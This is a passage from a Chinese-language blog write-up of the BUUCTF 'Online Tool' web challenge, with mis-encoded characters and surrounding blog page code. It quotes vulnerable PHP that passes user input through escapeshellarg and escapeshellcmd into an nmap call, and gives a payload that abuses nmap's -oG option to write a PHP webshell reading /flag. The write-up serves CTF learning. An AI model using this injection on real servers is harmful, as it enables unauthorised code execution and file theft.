·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½</span></span><br><span class="line"><span class="comment">       æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·) */</span></span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// escapeshellcmd â€”â€” shell å…ƒå­—ç¬¦è½¬ä¹‰</span></span><br><span class="line">    <span class="comment">/* å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚</span></span><br><span class="line"><span class="comment">       æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œ</span></span><br><span class="line"><span class="comment">       æˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’</span></span><br><span class="line"><span class="comment">       å…¥ï¼š &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$,\x0A å’Œ \xFFã€‚ &#x27; å’Œ &quot; ä»…åœ¨</span></span><br><span class="line"><span class="comment">       ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ </span></span><br><span class="line"><span class="comment">       % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ */</span></span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºé€šè¿‡ GET æ–¹æ³•æ¥æ”¶ä¸€ä¸ª <kbd>host</kbd> å˜é‡ï¼Œå¹¶é€šè¿‡ä¸¤ä¸ªå‡½æ•°å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå…¶ä¸­ <kbd>escapeshellarg</kbd> å‡½æ•°ä¼šå…ˆå°†å˜é‡ä¸­å«æœ‰çš„å•å¼•å·è½¬ä¹‰æ‰ï¼Œç„¶åå°†å•å¼•å·åˆ†å‰²ä¸‹çš„å‡ éƒ¨åˆ†éƒ½ç”¨å•å¼•å·æ‹¬èµ·æ¥ï¼Œè¿™æ ·å°±é‡æ–°è¿æ¥æˆäº†ä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ä¼ å…¥ <kbd>h-t-m&#39; myr 520</kbd>ï¼Œç»è¿‡ <kbd>escapeshellarg</kbd> å‡½æ•°å¤„ç†åå°±ä¼šå˜æˆ <kbd>&#39;h-t-m&#39;&#92;&#39;&#39; myr 520&#39;</kbd>ï¼Œå¯¹äº Shell æ¥è¯´å…¶å®å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² <kbd>&#39;h-t-m&#92;&#39; myr 520&#39;</kbd>ï¼Œè¿™ä¹Ÿå¯¼è‡´æˆ‘ä»¬å§‹ç»ˆä»…èƒ½æäº¤å•ä¸ªå‚æ•°è€Œä¸èƒ½æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚è€Œ <kbd>escapeshellcmd</kbd> å‡½æ•°åˆ™æ˜¯å¯¹ä¸€äº›å…ƒå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼ŒåŒ…æ‹¬å¸¸ç”¨çš„ç‰¹æ®Šç¬¦å·åŠä¸ºé…å¯¹çš„å•åŒå¼•å·ã€‚å¯¹å˜é‡ <kbd>host</kbd> æ“ä½œå®Œæ¯•åç¨‹åºå°±ä¼šæ ¹æ®å½“å‰åœ°å€æ¥é…åˆè®¡ç®—å‡º MD5 å€¼æ¥åˆ›å»ºæ–°ç›®å½•ï¼Œå¹¶éšååœ¨æ–°ç›®å½•ä¸­æ‰§è¡Œ <kbd>nmap</kbd> æ‰«æã€‚</p></li><li><kbd>escapeshellarg</kbd> å’Œ <kbd>escapeshellcmd</kbd> ä¸¤ä¸ªå‡½æ•°ç»“åˆåœ¨ä¸€èµ·å°±å¾ˆæœ‰æ„æ€äº†ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ [è¿™ç¯‡åšæ–‡](https://paper.seebug.org/164) ã€‚å¦‚å‰æ–‡ä¸­ç»è¿‡ <kbd>escapeshellarg</kbd> å‡½æ•°å¤„ç†åçš„å­—ç¬¦ä¸² <kbd>&#39;h-t-m&#39;&#92;&#39;&#39; myr 520&#39;</kbd>ï¼Œå†æ¬¡ç»è¿‡ <kbd>escapeshellcmd</kbd> å‡½æ•°å¤„ç†åˆ™ä¼šå˜æˆ <kbd>&#39;h-t-m&#39;&#92;&#92;&#39;&#39; myr 520&#92;&#39;</kbd>ã€‚åä¸€æ¬¡æ“ä½œå°†å‰ä¸€æ¬¡æ“ä½œåçš„è½¬ä¹‰å­—ç¬¦ç»™è½¬ä¹‰äº†ï¼ŒåŒæ—¶æœ«å°¾å•å¼•å·ä¹Ÿå› ä¸ºè½å•è€Œè¢«è½¬ä¹‰äº†ï¼Œå¯¹äº Shell æ¥è¯´ä¸Šè¿°æ•°æ®å°±æ˜¯ <kbd>h-t-m\ myr 520&#39;</kbd>ã€‚è¿™ä¸‹å¥½äº†ï¼Œæƒ³æ‰§è¡Œå¤šå°‘å‘½ä»¤å°±æ‰§è¡Œå¤šå°‘å‘½ä»¤ã€‚</li><li><p>åœ¨ <kbd>nmap</kbd> çš„å‚æ•°ä¸­ <kbd>-oG</kbd> å¯ç”¨äºå°†å‘½ä»¤ä»¥åŠç»“æœè¾“å‡ºåˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œå…¶ä¸­è¾“å‡ºç»“æœä¸å¥½æ§åˆ¶ï¼Œä½†æ˜¯å¦‚æœå‘½ä»¤å°±æ˜¯ä¸€æ®µ PHP ç¨‹åºç„¶åå†™å…¥çš„åˆæ˜¯ PHP æ–‡ä»¶çš„è¯ï¼Œä¹‹åè®¿é—®è¿™ä¸ªæ–‡ä»¶ä¸å°±æƒ³æ‰§è¡Œå•¥å°±æ‰§è¡Œå•¥ã€‚<kbd>payload</kbd> å¦‚ä¸‹ï¼Œæ ¹æ®ç»éªŒï¼Œç›´æ¥æŠŠæ ¹ç›®å½•çš„ <kbd>flag</kbd> æŠ“å‡ºæ¥ï¼Œåå¼•å·è¡¨ç¤ºå…ˆæ‰§è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;&lt;?php echo `cat /flag`;?&gt; -oG h-t-m.php &#x27;</span><br></pre></td></tr></table></figure><p>è¯¥ <kbd>payload</kbd> ç»ä¸¤ä¸ªå‡½æ•°å¤„ç†åå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;&lt;?php echo `cat /flag`;?&gt; -oG h-t-m.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>ç­‰ä»·äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo `cat /flag`;?&gt; -oG h-t-m.php \</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ–‡ä»¶åååº”ç•™æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œé¿å…æœ€åçš„åæ–œæ å¹²æ‰°æ–‡ä»¶åã€‚éšåæµè§ˆå™¨ä¾¿ä¼šå›æ˜¾ç»è¿‡ MD5 å“ˆå¸Œåçš„ç›®å½•åï¼Œæ²¿ç€è¯¥ç›®å½•è®¿é—® <kbd>h-t-m.php</kbd> å³å¯æ‹¿åˆ° <kbd>flag</kbd>ã€‚</p><img src="0051.webp" alt="" style="zoom:75%"></li></ul><h2 id="åè®°-3">åè®°</h2><p>â€ƒâ€ƒæœ¬ç¯‡åšå®¢è‡³æ­¤ä¹Ÿå°±ç»“æŸäº†ï¼Œæææƒšæƒšåˆæ˜¯ä¸€ä¸‡å­—ï¼Œç¬”è€…ä¸æ‡‚çš„å®åœ¨å¤ªå¤šäº†å°±æ˜¯è¯´ã€‚åœ¨ BUU æŒ‰é¡ºåºçš„é¢˜ç›®éš¾åº¦è¶Šæ¥è¶Šé«˜ï¼Œå¾ˆå¤šé¢˜ç›®åœ¨ä¸å·çœ‹å…¶ä»–å¸ˆå‚…ä»¬çš„ WP çš„æƒ…å†µä¸‹ç”šè‡³ä¸çŸ¥é“è¯¥å¹²å˜›ï¼Œè™½ç„¶å­¦åˆ°çš„è¶Šæ¥è¶Šå¤šï¼Œä½†æ˜¯äººä¹Ÿè¶Šæ¥è¶Šéº»äº†ã€‚</p><p>â€ƒâ€ƒå›å¤´çœ‹çœ‹çš„è¯ï¼Œç¬”è€…åšå®¢é¦–é¡µç«Ÿç„¶å †å¾—æ»¡æ»¡çš„å…¨æ˜¯ BUUï¼Œæƒ­æ„§æƒ­æ„§ï¼Œè¿˜æ˜¯åº”è¯¥æŠ½ç‚¹æ—¶é—´å¹²ç‚¹åˆ«çš„æœ‰æ„æ€çš„äº‹æƒ…ï¼Œå¤©å¤©è¢« BUU æ‰“å‡»å¯ä¸æ˜¯é•¿ä¹…ä¹‹è®¡ã€‚<psw>çœ‹äº†ä¸€çœ¼è‰ç¨¿ç®±ï¼Œæˆ‘ç«Ÿç„¶å·²ç»å­˜äº†ä¸€å †è¿˜æ²¡å®Œå·¥çš„åšå®¢ï¼Œè¶æœŸæœ«å¤ä¹ ï¼ˆæ•‘ï¼‰æŠ“ç‚¹ç´§éƒ½å†™å‡ºæ¥ã€‚</psw></p></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://h-t-m.top/posts/de7d7276/">https://h-t-m.top/posts/de7d7276/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>ä½œè€…</h><div class="post-copyright-cc-info"><h>h-t-m</h></div></div><div class="post-copyright-c"><h>å‘å¸ƒäº</h><div class="post-copyright-cc-info"><h>2022-11-08</h></div></div><div class="post-copyright-u"><h>æ›´æ–°äº</h><div class="post-copyright-cc-info"><h>2022-11-19</h></div></div><div class="post-copyright-c"><h>è®¸å¯åè®®</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">ç½‘ç»œå®‰å…¨</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/72821c8/"><img class="next-cover" src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”PWN 2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/posts/3ee43a5c/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 0"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-27</div><div class="title">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 0</div></div></a></div><div><a href="/posts/477423cc/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-08</div><div class="title">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 1</div></div></a></div><div><a href="/posts/3989fe45/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Basic 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Basic 1</div></div></a></div><div><a href="/posts/a080afff/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Basic 2"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-03</div><div class="title">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Basic 2</div></div></a></div><div><a href="/posts/aea4d4bd/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Crypto 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-23</div><div class="title">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Crypto 1</div></div></a></div><div><a href="/posts/bf54f980/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Misc 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Misc.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-21</div><div class="title">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Misc 1</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/logo.jpg" onerror='this.onerror=null,this.src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="author-info__name">h-t-m</div><div class="author-info__description">ä¸ªäººåšå®¢</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">28</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">56</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h-t-m"><i class="fab fa-github"></i><span>æ‰¾æˆ‘ç©~</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h-t-m/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1547563662@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/b3beff564d51a.png" target="_blank" title="å¾®ä¿¡"><i class="fab fa-weixin"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/eaa1e2110d4a7.png" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>å…¬å‘Š</span></div><div class="announcement_content">åšå®¢æ•´ä½“å‡çº§æ”¹é€ ä¸­</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">1.1.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">1.2.</span> <span class="toc-text">[HCTF 2018]admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-session-%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">flask session ä¼ªé€ </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode-%E6%AC%BA%E9%AA%97"><span class="toc-number">1.2.2.</span> <span class="toc-text">Unicode æ¬ºéª—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">æ¡ä»¶ç«äº‰</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">1.3.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-number">1.4.</span> <span class="toc-text">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">1.5.</span> <span class="toc-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-number">1.6.</span> <span class="toc-text">[MRCTF2020]Ez_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">1.7.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-number">1.8.</span> <span class="toc-text">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">1.9.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">1.10.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-number">1.11.</span> <span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">1.12.</span> <span class="toc-text">[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">1.13.</span> <span class="toc-text">[ç½‘é¼æ¯ 2018]Fakebook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">1.13.1.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-file"><span class="toc-number">1.13.2.</span> <span class="toc-text">load_file</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">1.14.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-number">1.15.</span> <span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">1.16.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-3"><span class="toc-number">1.17.</span> <span class="toc-text">åè®°</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/de7d7276/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2"></a><div class="content"><a class="title" href="/posts/de7d7276/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2</a><time datetime="2022-11-08T07:39:23.000Z" title="å‘è¡¨äº 2022-11-08 15:39:23">2022-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/72821c8/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”PWN 2"><img src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”PWN 2"></a><div class="content"><a class="title" href="/posts/72821c8/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”PWN 2">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”PWN 2</a><time datetime="2022-10-24T08:18:23.000Z" title="å‘è¡¨äº 2022-10-24 16:18:23">2022-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/aea4d4bd/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Crypto 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Crypto 1"></a><div class="content"><a class="title" href="/posts/aea4d4bd/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Crypto 1">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Crypto 1</a><time datetime="2022-10-23T06:36:23.000Z" title="å‘è¡¨äº 2022-10-23 14:36:23">2022-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bf54f980/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Misc 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Misc.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Misc 1"></a><div class="content"><a class="title" href="/posts/bf54f980/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Misc 1">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Misc 1</a><time datetime="2022-10-21T12:16:53.000Z" title="å‘è¡¨äº 2022-10-21 20:16:53">2022-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ee33782f/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Reverse 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Reverse.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Reverse 1"></a><div class="content"><a class="title" href="/posts/ee33782f/" title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Reverse 1">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Reverse 1</a><time datetime="2022-10-19T13:23:23.000Z" title="å‘è¡¨äº 2022-10-19 21:23:23">2022-10-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright"><span>&copy;2020 - 2022<svg style="width:1.5em;height:1.5em" aria-hidden="true"><use xlink:href="#icon-Butterfly"></use></svg></span><span>h-t-m</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="æ”¾å¤§å­—ä½“"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="ç¼©å°å­—ä½“"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script async>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",preloader.endLoading()),setTimeout((function(){preloader.endLoading()}),5e3)</script><div class="js-pjax"><link rel="stylesheet" href="https://npm.elemecdn.com/katex@latest/dist/katex.min.css"><script src="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.css"><script>document.querySelectorAll("#article-container span.katex-display").forEach((a=>{btf.wrap(a,"div",{class:"katex-wrap"})}))</script><script>document.getElementsByClassName("mermaid").length&&(window.mermaidJsLoad?mermaid.init():getScript("https://npm.elemecdn.com/mermaid/dist/mermaid.min.js").then((()=>{window.mermaidJsLoad=!0,mermaid.initialize({theme:"default"}),mermaid.init()})))</script><script>(()=>{const t=document.getElementById("twikoo-count"),e=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"https://twikoo-beta-seven.vercel.app/",region:""},null))},o=()=>{twikoo.getCommentsCount({envId:"https://twikoo-beta-seven.vercel.app/",region:"",urls:[window.location.pathname],includeReply:!1}).then((function(e){t.innerText=e[0].count})).catch((function(t){console.error(t)}))},n=(n=!1)=>{"object"==typeof twikoo?(e(),n&&t&&setTimeout(o,0)):getScript("https://npm.elemecdn.com/twikoo/dist/twikoo.all.min.js").then((()=>{e(),n&&t&&setTimeout(o,0)}))};btf.loadComment(document.getElementById("twikoo-wrap"),n)})()</script></div><div class="aplayer no-destroy" data-id="6751330199" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listfolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><script async src="/js/diytitle.js"></script><script async src="//at.alicdn.com/t/font_2987331_rwt2gum52cl.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script><script defer id="fluttering_ribbon" mobile="true" src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><script id="click-show-text" 